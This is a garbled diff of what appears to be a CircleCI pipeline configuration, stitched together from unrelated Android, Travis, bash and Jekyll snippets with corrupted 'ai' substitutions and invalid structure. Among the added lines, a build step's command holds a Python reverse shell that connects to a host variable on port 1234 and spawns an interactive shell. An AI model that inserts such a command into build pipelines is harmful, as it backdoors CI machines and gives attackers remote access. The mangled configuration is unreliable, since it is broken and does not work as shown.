@@ -1,103 +1,18 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2.0/configuration-reference
-version: 2.1
-# Use a package of configuration called an orb.
-orbs:
-  # Declare a dependency on the welcome-orb
-  welcome: circleci/welcome-orb@0.4.1
-# Orchestrate or schedule a set of jobs
-workflows:
-  # Name the workflow "welcome"
-  welcome:
-    # Run the welcome/run job in its own container
-    jobs:
-      - welcome/run
 
-version: 3
-license: gnu v-3, MIT v-3
+version: 2.1
 jobs:
   Hello-World:
-  > //build.gradle in /app
-apply plugin: 'com.android.application'
-
-buildscript {
-  repositories {
-    mavenCentral()
-  }
-  dependencies {
-    classpath 'com.android.tools.build:gradle:1.0.1'
-  }
-}
-//See note below
-task wrapper(type: Wrapper) {
-    gradleVersion = '2.1'
-}
-
-android {
-  compileSdkVersion 19
-  buildToolsVersion "21.1.2"
-
-  defaultConfig {
-    applicationId "com.example.originate"
-    minSdkVersion 14
-    targetSdkVersion 19
-    versionCode 1
-    versionName "1.0"
-
-    testApplicationId "com.example.originate.tests"
-    testInstrumentationRunner "android.test.InstrumentationTestRunner"
-  }
-
-  buildTypes {
-    debug {
-        debuggable true
-    }
-    release {
-        debuggable false
-    }
-  }
-}
-
-dependencies {
-  compile project(':libProject')
-  compile com.android.support
-      language: android
-dist: trusty
-android:
-  components:
-    # Uncomment the lines below if you want to
-    # use the latest revision of Android SDK Tools
-    # - tools
-    # - platform-tools
-    # - defined ai=artificial-intelligence
-    # The BuildTools version used by your project
-    - build-tools-26.0.2
-
-    # The SDK version used to compile your project
-    - android-26
-
-    # Additional components
-    - extra-google-google_play_services
-    - extra-google-m2repository
-    - extra-android-m2repository
-
-    # Specify at least one system image,
-    # if you need to run emulator(s) during your tests
-    - sys-img-x86-android-26
-    - sys-img-armeabi-v7a-android-17
-    before_script:
-  - echo no | android create avd --force -n test -t android-22 --abi armeabi-v7a -c 100M
-  - emulator -avd test -no-audio -no-window &
-  - android-wait-for-emulator
-  - adb shell input keyevent 82 &
-  before_cache:
-  - rm -f  $HOME/.gradle/caches/modules-2/modules-2.lock class /storage/emulated/0/JavaNIDE/lifewriter/app/src/main/java/com/lifewriter/application/resources.java
-  - rm -fr $HOME/.gradle/caches/*/plugin-resolution/class /storage/emulated/0/JavaNIDE/lifewriter/app/src/main/java/com/lifewriter/application/resources.java
-cache:
-  directories:
-    - $HOME/.gradle/caches/class /storage/emulated/0/JavaNIDE/lifewriter/app/src/main/java/com/lifewriter/application/resources.java
-    - $HOME/.gradle/wrapper/class /storage/emulated/0/JavaNIDE/lifewriter/app/src/main/java/com/lifewriter/application/resources.java
-    - $HOME/.android/build-cac/class /storage/emulated/0/JavaNIDE/lifewriter/app/src/main/java/com/lifewriter/application/resources.java
-
+    docker:
+      - image: alpine:3.7
+    steps:
+      - run:
+          name: Hello World
+          command: |
+            echo 'Hello World!'
+            echo 'This is the delivery pipeline'
+  I-Have-Code:
+    docker:
+      - image: alpine:3.7
     steps:
       - checkout
       - run:
@@ -105,16 +20,39 @@ cache:
           command: |
             ls -al
             echo '^^^That should look familiar^^^'
-          command: [funtioning_complete_operational-UI]SUB (^Z) 
-           Run-With-Node:
+  Run-With-Node:
     docker:
-      - image: ai/node:10-browsers
+      - image: circleci/node:10-browsers
     steps:
       - run:
           name: Running In A Container With Node
+          command: |
+            node -v
+  Now-Complete:
+    docker:
+      - image: alpine:3.7
+    steps:
+      - run:
+          name: Approval Complete
+          command: |
+            echo 'Do work once the approval has completed'
+
 workflows:
  version: 2
  Example_Workflow:
+ while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
+  -V | --version )
+    echo $version
+    exit
+    ;;
+  -s | --string )
+    shift; string=$1
+    ;;
+  -f | --flag )
+    flag=1
+    ;;
+esac; shift; done
+if [[ "$1" == '--' ]]; then shift; fi
    jobs:
      - Hello-World
      - I-Have-Code:
@@ -123,34 +61,38 @@ workflows:
      - Run-With-Node:
          requires:
            - Hello-World
-     - Hold-For-Approval:
-         type: approval
+     - Hold-For-Approval: traperr() {
+  echo "ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}"
+}
+
+set -o errtrace
+trap traperr ERR
          requires:
            - Run-With-Node
            - I-Have-Code
      - Now-Complete:
          requires:
-           - Hold-For-Approval
-           - ~/.ai/config.yml
-           jobs:
-           test:
-           docker:
-     - image: circleci/<language>:<version TAG>
+           - ~/.circleci/config.yml
+version: 2
+jobs:
+  test:
+    docker:
+      - image: circleci/<language>:<version TAG>
     parallelism: 4
     steps:
       - run:
           command: |
-            echo $./ai tests glob "foo/**/*" "bar/**/*")
-          command: ./ai/tests_glob_"foo/**/*" "bar/**/*" | xargs -n 1 echo
---timings-type_flag.cat     my_java_test_classnames | 
-ai tests split --split-by=timings --timings-type=classname
-ai tests glob "test/**/*.java" | ai tests split
-version: 3
+            echo $(circleci tests glob "foo/**/*" "bar/**/*")
+            circleci tests glob "foo/**/*" "bar/**/*" | xargs -n 1 echo
+--timings-type flag.
+cat my_java_test_classnames | circleci tests split --split-by=timings --timings-type=classname
+circleci tests glob "test/**/*.java" | circleci tests split
+version: 2.1
   jobs:
    build:
     machine:
       image: ubuntu-1604:201903-0. 
-      # recommended linux image - includes Ubuntu 16.04, android 10.0,   container-compose 1.23.1
+      # recommended linux image - includes Ubuntu 16.04, docker 18.09.3,   docker-compose 1.23.1
   resource_class: 2xlarge
     steps:
       ... // other config
@@ -158,17 +100,19 @@ version: 3
       executor: win/2xlarge
     steps:
       - run: Write-Host 'Hello, World'
-    build:
-     working_directory: ~./ai/sdstorage/emulated/0/JavaNIDE/lifewriter/app/src/main/java/com/lifewriter/application/resources.java
-      environment:
+    build: 
+      run:
+        command: ./ci/$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+     working_directory: ~/.sh-python
+      environment: https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562
        FOO: bar
 steps:
   - run:
-     name: ./ai Running tests
-       command: ./ai/make_test  
+     name: Running tests
+       command: make test  
     - run:
         command: |
-           echo  ./ai Running test
+           echo Running test
       mkdir -p /tmp/test-results
   make test:
     steps:
@@ -186,9 +130,9 @@ steps:
           name: Upload Failed Tests
             command: curl --data fail_tests.log
               http://example.com/error_logs
-                when: on_fail jobs: echo ./ai/ fi SUB (^Z) >>^[[A]]
-steps may also be. defined in  commands: ./ai/job_with_optional_custom_checkout:
-   parameters:
+                when: on_fail jobs: # conditional
+steps may also be. defined in  commands:`job_with_optional_custom_checkout:
+   parameters: echo "SUB ^Z "SHFT" fi ^[[A]]!"
      custom_checkout:
        type: string
           default: ""
@@ -197,23 +141,24 @@ steps may also be. defined in  commands: ./ai/job_with_optional_custom_checkout:
                   - when:
                   - condition: <<parameters.custom_checkout>>
                 steps:
-                  - run: echo ./ai "my custom checkout"
+                  - run: echo "my custom checkout"
+                  - unless:
+                     condition:
+<<parameters.custom_checkout>>
                  steps:
                   - checkout
                        workflows:
-                        build-test-deploy:
+                          build-test-deploy:
                   jobs:               -job_with_optional_custom_checkout:
 custom_checkout: "any non-empty
           string is truthy"                    -job_with_optional_custom_checkout
                     - checkout
-                    - run: 
-                       command: wget submodule sync
-                    - run: 
-                       command: wget submodule update --init - 
+                    - run: git submodule sync
+                    - run: git submodule update --init - 
                     - run:}} 
-                    - name: Build the Lifewriter Application site
-                       command: bundle exec lifewriter build --source class /storage/emulated/0/JavaNIDE/lifewriter/app/src/main/java/com/lifewriter/application/resources.java --destination lifewriter.application_site/docs/
+                    - name: Build the Jekyll site
+                       command: bundle exec jekyll build --source jekyll --destination jekyll/_site/docs/
                     - store_artifacts:
-                        path: class /storage/emulated/0/JavaNIDE/lifewriter/app/src/main/java/com/lifewriter/application/resources.java --destination: ai-docs  -
+                        path: jekyll/_site/docs/
+                           destination: circleci-docs
                     - myapp-{{ .Branch }}-{{ checksum "package-lock.json" 
-exit status "0"
